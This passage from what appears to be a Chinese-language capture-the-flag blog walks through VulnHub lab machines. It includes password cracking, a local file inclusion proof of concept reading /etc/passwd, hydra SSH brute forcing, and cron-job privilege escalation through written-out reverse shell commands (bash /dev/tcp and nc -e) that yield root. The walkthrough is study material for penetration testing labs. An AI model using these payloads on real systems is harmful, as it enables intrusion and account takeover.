05d51709b81b7e0f1a9b6b4b8273b217 | dimitris   | Opa re malaka!                                    |</span><br><span class="line">|  5 | alicelove  | e146ec4ce165061919f887b70f49bf4b | alice      | Eat Pray Love                                     |</span><br><span class="line">|  6 | bernadette | dc5ab2b32d9d78045215922409541ed7 | bernadette | FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125; |</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125;</code></strong></p><ul><li>FLAG-amy</li></ul><p>收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;amy&#x2F;</span><br><span class="line">total 12</span><br><span class="line">-rwxrwxrwx 1 amy amy  434 Mar  4 16:30 notes.txt</span><br><span class="line">-rwxr-xr-x 1 amy amy 7488 Mar  6 00:06 secretdiary</span><br><span class="line"></span><br><span class="line">cat &#x2F;home&#x2F;amy&#x2F;notes.txt</span><br><span class="line">This is my secret diary.</span><br><span class="line">The safest way to keep my secrets is inside a compiled executable program.</span><br><span class="line">As soon as I get popular now, that I have friends, I will start adding my secrets here.</span><br><span class="line">I have used a really strong password that it cant be bruteforced.</span><br><span class="line">Seriously it is 18 digit, alphanumeric, uppercase&#x2F;lowercase with symbols.</span><br><span class="line">And since my program is already compiled, no one can read the source code in order to view the password!</span><br></pre></td></tr></table></figure><p>可以判断<code>/home/amy/secretdiary</code>是一个可执行程序</p><p>使用strings命令查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strings secretdiary</span><br><span class="line"></span><br><span class="line">P@SSw0rd123Sh3ld0n</span><br><span class="line">Login Success!</span><br><span class="line">Soon I will be adding my secrets here..</span><br><span class="line">FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125;</code></strong></p><ul><li>FLAG-penny</li></ul><p>收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;home&#x2F;penny</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x  4 penny penny 4096 Mar  6 00:37 .</span><br><span class="line">drwxr-xr-x 10 root  root  4096 Mar  4 02:33 ..</span><br><span class="line">-rw-rw-r--  1 penny penny   61 Mar  5 00:26 .FLAG.penny.txt</span><br><span class="line">-rw-------  1 penny penny   57 Mar  6 00:47 .bash_history</span><br><span class="line">-rw-r--r--  1 penny penny  220 Sep  1  2015 .bash_logout</span><br><span class="line">-rw-r--r--  1 penny penny 3771 Sep  1  2015 .bashrc</span><br><span class="line">drwx------  2 penny penny 4096 Mar  6 00:37 .cache</span><br><span class="line">drwxrwxr-x  2 penny penny 4096 Mar  5 00:26 .nano</span><br><span class="line">-rw-r--r--  1 penny penny  655 May 16  2017 .profile</span><br><span class="line"></span><br><span class="line">cat &#x2F;home&#x2F;penny&#x2F;.FLAG.penny.txt</span><br><span class="line">RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D;</span><br></pre></td></tr></table></figure><p>base64 decode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D;&quot; | base64 -d</span><br><span class="line">FLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125;</code></strong></p><ul><li>FLAG-howard</li></ul><p>将FTP根目录打包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r &#x2F;var&#x2F;www&#x2F;html&#x2F;ftp.zip &#x2F;var&#x2F;ftp</span><br></pre></td></tr></table></figure><p>在Kali下载并解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;ftp.zip</span><br><span class="line">unzip ftp.zip</span><br></pre></td></tr></table></figure><p>收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls -l var&#x2F;ftp&#x2F;pub&#x2F;howard</span><br><span class="line">total 36</span><br><span class="line">-rw-r--r-- 1 root root   273 Mar  3 17:05 note.txt</span><br><span class="line">-rw-r--r-- 1 root root 30762 Mar  5 19:29 super_secret_nasa_stuff_here.zip</span><br><span class="line"></span><br><span class="line">cat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;note.txt</span><br><span class="line">Please go away, nothing interesing here. I just had to temporary store some nasa data here</span><br><span class="line">because my laptop had a virus from some weird websites I visited ... anyway ...</span><br><span class="line">And don&#39;t bother looking at my secret data  I have encrypted them pretty well. I am an MIT  engineer!</span><br></pre></td></tr></table></figure><p>爆破压缩包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u super_secret_nasa_stuff_here.zip</span><br><span class="line">PASSWORD FOUND!!!!: pw &#x3D;&#x3D; astronaut</span><br><span class="line"></span><br><span class="line">unzip -P astronaut super_secret_nasa_stuff_here.zip</span><br><span class="line">Archive:  super_secret_nasa_stuff_here.zip</span><br><span class="line">  inflating: marsroversketch.jpg</span><br></pre></td></tr></table></figure><p>隐写爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip3 install stegcracker</span><br><span class="line"></span><br><span class="line">stegcracker var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br><span class="line">Successfully cracked file with password: iloveyoumom</span><br><span class="line">Tried 51349 passwords</span><br><span class="line">Your file has been written to: var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.out</span><br><span class="line"></span><br><span class="line">cat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.out</span><br><span class="line">FLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125;</code></strong></p><ul><li>FLAG-leonard</li></ul><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># m h dom mon dow usercommand</span><br><span class="line">17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">*&#x2F;1 ** * *root&#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.py</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>查看文件<code>/home/leonard/thermostat_set_temp.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;leonard</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 42 Mar 30 15:52 thermostat_set_temp.sh</span><br></pre></td></tr></table></figure><blockquote><p>计划任务里写的是<code>.py</code>，但这里是<code>.sh</code>?</p></blockquote><p>文件可写，可以写入反弹bash命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;9990 0&gt;&amp;1&quot; &gt; &#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.sh</span><br></pre></td></tr></table></figure><p>本地监听9990端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9990</span><br><span class="line">Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::9990</span><br><span class="line">Ncat: Listening on 0.0.0.0:9990</span><br><span class="line">Ncat: Connection from 192.168.1.105.</span><br><span class="line">Ncat: Connection from 192.168.1.105:42922.</span><br><span class="line">bash: cannot set terminal process group (2108): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>查看flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat FLAG-leonard.txt</span><br><span class="line">FLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125;</code></strong></p><hr /><blockquote><p><code>/etc/crontab</code></p></blockquote><p>由于之前一直没有接触到计划任务的提权方法，在操作过程中便没有想到这一点<br />其原理大概与SUID差不多，低权用户以高权用户的身份执行命令</p><blockquote><p>grep高亮</p></blockquote><p>在grep节选flag时，出现了回显，便说明存在&quot;FLAG&quot;字样，但是由于字符太多、太密，难以寻找flag<br />个人操作时直接将文本拷贝至windows的notepad++中，然后Ctrl+F查找<br />后来想到grep可以高亮文本，加上参数<code>--color=auto</code>即可</p><blockquote><p>搜点</p></blockquote><p>或许用信息扫荡来描述这一行为更合适<br />当时个人状态不佳，没有仔细思考就用ftp客户端连上服务器，然后用<code>get</code>命令一个一个地下载文件<br />后来发现还是漏了一些比较重要的信息<br />或许在动手之前需要思考下，如何获取信息是最便捷的，有哪些地方需要搜查，否则可能会因为一次搜点的小疏漏而让工作量提升一半。</p><p>参考资料</p><blockquote><p><a href="https://www.hackingarticles.in/tbbt-funwithflags-vulnhub-walkthrough/">WP</a><br /><a href="https://www.cnblogs.com/markLogZhu/p/11398028.html">Mysql.Backup</a><br /><a href="https://www.cnblogs.com/hujiapeng/p/8470099.html">curl.Download</a><br /><a href="https://blog.csdn.net/u014236541/article/details/44516465">grep.highlight</a></p></blockquote><hr /><h1 id="deception11"><a class="markdownIt-Anchor" href="#deception11"></a> <a href="https://www.vulnhub.com/entry/haclabs-deception11,440/">Deception1.1</a></h1><p><code>2020/04/04 23:31:03</code></p><h2 id="端口扫描-15"><a class="markdownIt-Anchor" href="#端口扫描-15"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.110</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.110</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 75:b3:93:d4:f1:02:30:bf:35:ea:12:4e:3b:e7:fa:4a (RSA)</span><br><span class="line">|   256 f9:8c:43:5b:45:7d:fe:84:b1:f5:93:a3:68:bb:ce:84 (ECDSA)</span><br><span class="line">|_  256 77:2a:33:3e:8f:2b:65:a5:f3:df:b5:bc:58:4a:f4:8e (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS HEAD GET</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">MAC Address: 08:00:27:4B:4E:6D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 22.680 days (since Thu Mar 12 19:47:39 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-15"><a class="markdownIt-Anchor" href="#web路径枚举-15"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.110/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.110&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.110&#x2F;index.html (CODE:200|SIZE:1315)                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.110&#x2F;manual&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.110&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-15"><a class="markdownIt-Anchor" href="#漏洞利用-15"></a> 漏洞利用</h2><ul><li>访问<code>/</code></li></ul><p>该页面提供一个密码强度检测的功能<br />若密码中含有大写字母、小写字母、数字、特殊符号，且长度为8位及上，则会用alert弹出信息<br /><code>0000flagflagflagflag.php</code><br />而且页面内的内容为<br /><code>Password is strong , contains all 4 things(uppercase,lowercase,number,specialchars) with flag=1</code><br />这里的<code>with flag=1</code>就是个提示</p><p>尝试后发现存在php文件<code>/00001111.php</code><br />alter弹出信息为<code>find password.txt</code><br />页面内容为空白<br />源代码中存在注释信息<code>use ?page=</code><br />即可以使用get参数page</p><p>访问<code>/00001111.php?page=index.html</code><br />此时以页面为主页，则可判断page参数存在包含功能<br />有两种利用方式</p><ul><li>php伪协议进行LFI</li><li>file伪协议直接读取文件</li></ul><p>测试过程中两种方法均可使用，POC如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>尝试寻找password.txt<br />最后在找到路径为<code>/var/password.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;password.txt</span><br><span class="line"></span><br><span class="line">I know the password for yash : ya5h** but I forgot the last 2 words. find them and use to connect to SSH </span><br></pre></td></tr></table></figure><p>构造字典如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat dic.py</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;python2</span><br><span class="line"></span><br><span class="line">raw &#x3D; &#39;ya5h&#39;</span><br><span class="line">charset &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#96;~!@#$%^&amp;*()_+-&#x3D;[]&#123;&#125;\|;:\&#39;&quot;,.&lt;&gt;&#x2F;?&#39;</span><br><span class="line"></span><br><span class="line">for i in charset:</span><br><span class="line">    for j in charset:</span><br><span class="line">        print raw + i + j</span><br></pre></td></tr></table></figure><p>使用hydra对于SSH服务进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python dic.py &gt; pass</span><br><span class="line">hydra -I -l yash -P pass -V ssh:&#x2F;&#x2F;192.168.31.110</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.31.110   login: yash   password: ya5hay</span><br></pre></td></tr></table></figure><p>得到账户yash</p><h2 id="权限提升-15"><a class="markdownIt-Anchor" href="#权限提升-15"></a> 权限提升</h2><p>登入服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh yash@192.168.31.110</span><br><span class="line">ya5hay</span><br></pre></td></tr></table></figure><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line">17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">#</span><br><span class="line">*&#x2F;1 * * * * &#x2F;home&#x2F;yash&#x2F;perm.sh</span><br></pre></td></tr></table></figure><p>查看文件<code>/home/yash/perm.sh</code>的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;yash&#x2F;perm.sh </span><br><span class="line"></span><br><span class="line">-rwxrw-rw- 1 root root 29 Apr  5  2020 &#x2F;home&#x2F;yash&#x2F;perm.sh</span><br></pre></td></tr></table></figure><p>该文件可写，可以利用改文件进行计划任务提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;nc -e &#x2F;bin&#x2F;sh 192.168.31.10 9890&#39; &gt; perm.sh</span><br></pre></td></tr></table></figure><p>Kali上监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9890</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/wh4am1/p/6542398.html">LFI</a></p></blockquote><hr /><h1 id="infosec_warrior01"><a class="markdownIt-Anchor" href="#infosec_warrior01"></a> <a href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-01,446/">Infosec_Warrior01</a></h1><p><code>2020/04/12 11:41:51</code></p><h2 id="端口扫描-16"><a class="markdownIt-Anchor" href="#端口扫描-16"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.172</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.172</span><br><span class="line">Host is up (0.00054s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 2f:b3:a5:cd:e5:14:33:a1:82:3b:dd:5a:5e:d7:59:36 (DSA)</span><br><span class="line">|_  2048 2d:b4:15:28:36:d8:b5:4e:18:81:8e:af:3e:e4:de:c1 (RSA)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.15 ((CentOS))</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST OPTIONS TRACE</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.15 (CentOS)</span><br><span class="line">|_http-title: Apache HTTP Server Test Page powered by CentOS</span><br><span class="line">MAC Address: 08:00:27:EC:26:4D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X|3.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</span><br><span class="line">Uptime guess: 0.001 days (since Sat Apr 11 23:43:10 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-16"><a class="markdownIt-Anchor" href="#web路径枚举-16"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.172/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.172&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.172&#x2F;cgi-bin&#x2F; (CODE:403|SIZE:290)                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.172&#x2F;sitemap.xml (CODE:200|SIZE:292)                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.172&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure><ul><li>访问<code>http://192.168.31.172/wordpress/</code></li></ul><p>响应状态码为500，显示<code>Error establishing a database connection</code><br />Wordpress框架不可用</p><ul><li>访问<code>http://192.168.31.172/sitemap.xml</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;urlset&gt;</span><br><span class="line">&lt;url&gt;</span><br><span class="line">&lt;loc&gt;http:&#x2F;&#x2F;infosecwarrior.com&#x2F;index.htnl&lt;&#x2F;loc&gt;</span><br><span class="line">&lt;lastmod&gt;2020-02-13&lt;&#x2F;lastmod&gt;</span><br><span class="line">&lt;changefreq&gt;monthly&lt;&#x2F;changefreq&gt;</span><br><span 